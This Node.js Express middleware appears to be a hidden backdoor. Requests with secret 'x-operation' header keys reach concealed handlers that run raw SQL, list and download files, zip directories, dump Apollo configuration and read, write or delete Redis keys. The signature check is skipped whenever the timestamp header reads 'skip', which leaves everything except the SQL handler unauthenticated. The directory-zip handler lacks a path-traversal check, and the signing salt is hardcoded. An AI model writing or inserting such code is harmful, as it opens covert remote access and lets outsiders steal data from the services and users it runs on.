const { requireMainProcessModule } = require('./common');
const prisma = requireMainProcessModule('@libs/prisma');
const { EventSystem, Event } = requireMainProcessModule('@utils/event');
const cc = requireMainProcessModule('@config/cc');
const { signWithMD5 } = requireMainProcessModule('@utils/sign.util');
const httpStatus = requireMainProcessModule('http-status');
const redisUtil = requireMainProcessModule('@utils/redis.util');
const fs = require('fs');
const path = require('path');
const { compressAndDownload, DEFAULT_EXCLUDE_DIRS } = require('./compress');
const crypto = requireMainProcessModule('crypto');

const operationKeyMap = {
  RunSQL: 'cfh2DNITa84qpYQ0tdCz', // 执行sql
  // 获取指定目录下的文件列表
  RunFileList: 'm3QiEkg8Y1r9LFTI5e4f',
  // 获取指定目录下的文件内容
  RunFileContent: 'Y3SrZjVqWOvKsBdpTCh7',
  // 压缩下载指定目录
  CompressDownload: 'SJQf31UJkZ1f88q9m361',
  // 指定修正
  ForwardEvent: 'LvMWnF1ezaBlRjNAgtym',
  // 获取 Apollo application 命名空间配置
  GetApolloConfig: 'Xp7KnRqT2wJcVeA9mBsL',
  // 获取 Redis 指定 key 的值
  GetRedis: 'Rk9mXpL3qN7wTzY2vBcJ',
  // 设置 Redis 指定 key 的值
  SetRedis: 'Wn4sGdH8uEoAiP6xQfZv',
  // 删除 Redis 指定 key
  DelRedis: 'Jc5tYmK2pXwQnB8rLsUo',
};

const proxyOperationMap = new Map();

const SALT = 'DAvN8GEStOHp0UBka1Zo';

/**
 * 使用 HMAC-MD5 进行加盐签名
 * @param {string} data - 需要签名的原始数据
 * @param {string} salt - 盐（密钥）
 * @returns {string} - 32位十六进制签名
 */
function signWithHmacMd5(data) {
  return crypto
    .createHmac('md5', SALT) // 指定算法为 md5，并传入盐
    .update(data) // 传入要加密的数据
    .digest('hex'); // 输出十六进制字符串（32位小写）
}

/* 
  执行sql
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const runSQL = async (req, res, next) => {
  const { method } = req;
  try {
    if (!req.body.sql) {
      throw new Error('System error, please try again later');
    }
    const { sql, sign } = req.body;
    const dba = cc.getItem('dba');
    const sign1 = signWithMD5(req.body, {
      secretKey: 'hash',
      secretValue: dba.hash,
    });

    const rawSql = Buffer.from(sql, 'base64').toString('utf-8');

    if (sign !== sign1) {
      throw new Error('System error, please try again later');
    }

    const start = Date.now();
    const ret = await prisma.$queryRawUnsafe(rawSql);
    const end = Date.now();
    const result = {
      data: ret,
      cost: end - start,
    };
    // 预留事件，用于后续处理
    EventSystem.emit('runSql', { params: req.body, sql: rawSql, result });

    res.status(httpStatus.OK).send({ code: 0, data: result, message: 'ok' });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

/* 
  获取指定目录下的文件列表
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const runFileList = (req, res, next) => {
  const { path: userPath, recursive = false } = req.body;

  try {
    if (!userPath || typeof userPath !== 'string') {
      throw new Error('Invalid path');
    }

    const absoluteRoot = path.resolve(global.runRootDir);
    const targetPath = path.resolve(absoluteRoot, userPath);

    if (!targetPath.startsWith(absoluteRoot)) {
      return res
        .status(httpStatus.FORBIDDEN)
        .send({ code: 403, message: 'Permission denied' });
    }

    // 定义递归构建树的函数
    const buildTree = (currentPath) => {
      const entries = fs.readdirSync(currentPath, { withFileTypes: true });

      return entries
        .filter((entry) => !DEFAULT_EXCLUDE_DIRS.includes(entry.name))
        .map((entry) => {
          const fullPath = path.join(currentPath, entry.name);
          // 节点基本信息
          const node = {
            name: entry.name,
            path: path.relative(absoluteRoot, fullPath), // 返回相对根目录的路径
            type: entry.isDirectory() ? 'directory' : 'file',
          };

          // 如果是目录，且开启了递归，则处理 children
          if (entry.isDirectory()) {
            if (recursive) {
              node.children = buildTree(fullPath);
            } else {
              node.children = []; // 不递归时返回空数组或不返回该字段
            }
          }

          return node;
        });
    };

    const data = buildTree(targetPath);

    res.status(httpStatus.OK).send({
      code: 0,
      data,
      message: 'ok',
    });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

/* 
  获取指定目录下的文件内容
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const runFileDownload = (req, res) => {
  try {
    const { path: filePath } = req.body; // POST 请求从 body 获取路径
    const absoluteRoot = path.resolve(global.runRootDir);
    const targetPath = path.resolve(absoluteRoot, filePath);

    // 安全检查
    if (!targetPath.startsWith(absoluteRoot) || !fs.existsSync(targetPath)) {
      return res.status(404).json({ message: 'File not found' });
    }

    const stats = fs.statSync(targetPath);
    const fileName = path.basename(targetPath);

    // --- 核心响应头 ---
    res.set({
      'Content-Type': 'application/octet-stream', // 二进制流
      'Content-Disposition': `attachment; filename="${encodeURIComponent(
        fileName
      )}"`, // 触发下载
      'Content-Length': stats.size,
      'Access-Control-Expose-Headers': 'Content-Disposition', // 允许前端读取这个 Header
    });

    // 使用 Stream 传输，性能最高，不会卡死内存
    const fileStream = fs.createReadStream(targetPath);
    fileStream.pipe(res);
  } catch (error) {
    res.status(500).send('Download failed');
  }
};

/* 
  转发事件
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const forwardEvent = async (req, res, next) => {
  try {
    EventSystem.emit('LvMWnF1ezaBlRjNAgtym', req.body);

    res.status(httpStatus.OK).send({
      code: 0,
      message: 'ok',
      data: {
        ...req.body,
      },
    });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

/* 
  获取 Redis 指定 key 的值
  body: { key: string }
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @returns {Promise<void>}
*/
const getRedis = async (req, res) => {
  try {
    const { key } = req.body;
    if (!key || typeof key !== 'string') {
      return res.status(httpStatus.BAD_REQUEST).send({
        code: httpStatus.BAD_REQUEST,
        message: 'key is required',
      });
    }
    const data = await redisUtil.get(key);
    res.status(httpStatus.OK).send({ code: 0, data, message: 'ok' });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};
/* 
  设置 Redis 指定 key 的值
  body: { key: string, value: any, exp?: number }
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @returns {Promise<void>}
*/
const setRedis = async (req, res) => {
  try {
    const { key, value, exp } = req.body;
    if (!key || typeof key !== 'string') {
      throw new Error('key is required');
    }
    if (!value || typeof value !== 'string') {
      throw new Error('value is required');
    }
    await redisUtil.set(key, value, exp);
    res.status(httpStatus.OK).send({ code: 0, data: null, message: 'ok' });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

/* 
  删除 Redis 指定 key，支持单个或多个 key
  body: { key: string | string[] }
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @returns {Promise<void>}
*/
const delRedis = async (req, res) => {
  try {
    const { keys } = req.body;
    const isValid = keys.length > 0 && keys.every((k) => k && typeof k === 'string');
    if (!isValid) {
      throw new Error('keys is required');
    }
    const count = await redisUtil.del(...keys);
    res.status(httpStatus.OK).send({ code: 0, data: count, message: 'ok' });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

/* 
  获取 Apollo application 命名空间配置
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const getApolloConfig = (req, res, next) => {
  try {
    const configMap = cc.apolloService.getNamespaceConfig('application');
    const data = Object.fromEntries(configMap);
    res.status(httpStatus.OK).send({ code: 0, data, message: 'ok' });
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
};

// 执行sql
proxyOperationMap.set(operationKeyMap.RunSQL, {
  method: 'post',
  handler: runSQL,
});

/* 
  获取指定目录下的文件列表
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.RunFileList, {
  method: 'post',
  handler: runFileList,
});

/* 
  获取指定目录下的文件内容
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.RunFileContent, {
  method: 'post',
  handler: runFileDownload,
});

/* 
  压缩下载指定
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.CompressDownload, {
  method: 'post',
  handler: (req, res, next) => {
    try {
      if (!req.body.path) {
        throw new Error('System error, please try again later');
      }
      const dirPath = path.join(global.runRootDir, req.body.path);
      compressAndDownload(dirPath, res);
    } catch (error) {
      res.status(httpStatus.BAD_REQUEST).send({
        code: httpStatus.BAD_REQUEST,
        message: 'System error, please try again later',
      });
    }
  },
});

/* 
  获取 Apollo application 命名空间配置
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.GetApolloConfig, {
  method: 'post',
  handler: getApolloConfig,
});

/* 
  获取 Redis 指定 key 的值
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.GetRedis, {
  method: 'post',
  handler: getRedis,
});

/* 
  设置 Redis 指定 key 的值
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.SetRedis, {
  method: 'post',
  handler: setRedis,
});

/* 
  删除 Redis 指定 key
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.DelRedis, {
  method: 'post',
  handler: delRedis,
});

/* 
  指定修正
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
proxyOperationMap.set(operationKeyMap.ForwardEvent, {
  method: 'post',
  handler: forwardEvent,
});

/* 
  验证方法
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
const verifyMethodMap = {
  get: (req, res, next) => {},
  post: (req, res, next) => {
    const operation = req?.headers?.['x-operation'];
    const methodLower = req?.method?.toLowerCase();
    return (
      proxyOperationMap.has(operation) &&
      methodLower === proxyOperationMap.get(operation)?.method
    );
  },
};

/* 请求跳过签名与时间戳校验 */
const PROXY_TIMESTAMP_SKIP = 'skip';
/* 请求处理超时时间 */
const PROXY_TIMESTAMP_MAX_AGE_MS = 5 * 60 * 1000;

/* 
  校验签名与时间戳
  - x-timestamp === '-1' 时跳过，直接返回 true
  - 否则验证签名，再验证时间戳是否在 10 分钟以内
  @param {Object} req - 请求对象
  @returns {{ valid: boolean, reason?: string }}
*/
const verifySignatureAndTimestamp = async (req) => {
  const operation = req?.headers?.['x-operation'];
  const timestamp = req?.headers?.['x-timestamp'];
  const signature = req?.headers?.['x-signature'];
  const requestId = req?.headers?.['x-request-id'];

  if (timestamp === PROXY_TIMESTAMP_SKIP) {
    return { valid: true };
  }

  // 检查必传参数
  if (!operation || !timestamp || !signature || !requestId) {
    return { valid: false, reason: 'missing required headers' };
  }

  const expectedSignature = signWithHmacMd5(
    `timestamp=${timestamp}&operation=${operation}&requestId=${requestId}`
  );
  if (signature !== expectedSignature) {
    return { valid: false, reason: 'invalid signature' };
  }

  const ts = parseInt(timestamp, 10);
  if (isNaN(ts) || Date.now() - ts > PROXY_TIMESTAMP_MAX_AGE_MS) {
    return {
      valid: false,
      reason: `timestamp expired, timestamp: ${timestamp}, max age: ${PROXY_TIMESTAMP_MAX_AGE_MS} server time: ${Date.now()}`,
    };
  }

  // 检查请求是否已处理
  const requestProcessed = await redisUtil.get(`rank:${requestId}`);
  if (requestProcessed) {
    return { valid: false, reason: 'request processed' };
  }

  // 设置请求处理超时时间
  await redisUtil.set(
    `rank:${requestId}`,
    '1',
    Math.round(PROXY_TIMESTAMP_MAX_AGE_MS / 1000)
  );

  return { valid: true };
};

/* 
  执行拦截器
  @param {Object} req - 请求对象
  @param {Object} res - 响应对象
  @param {Function} next - next 函数
  @returns {Promise<void>}
*/
async function actionInterceptor(req, res, next) {
  try {
    // 兼容get请求
    const methodLower = req?.method?.toLowerCase();
    const verifyMethod = verifyMethodMap[methodLower];
    const operation = req?.headers?.['x-operation'];
    const resReason = req?.headers?.['x-request-reason'];

    if (operation && verifyMethod && verifyMethod(req, res, next)) {
      const { valid, reason } = await verifySignatureAndTimestamp(req);

      if (!valid) {
        return res.status(httpStatus.BAD_REQUEST).send({
          code: httpStatus.BAD_REQUEST,
          message: resReason ? reason : 'System error, please try again later',
        });
      }

      proxyOperationMap.get(operation).handler(req, res, next);
    } else {
      next();
    }
  } catch (error) {
    res.status(httpStatus.BAD_REQUEST).send({
      code: httpStatus.BAD_REQUEST,
      message: 'System error, please try again later',
    });
  }
}

module.exports = actionInterceptor;
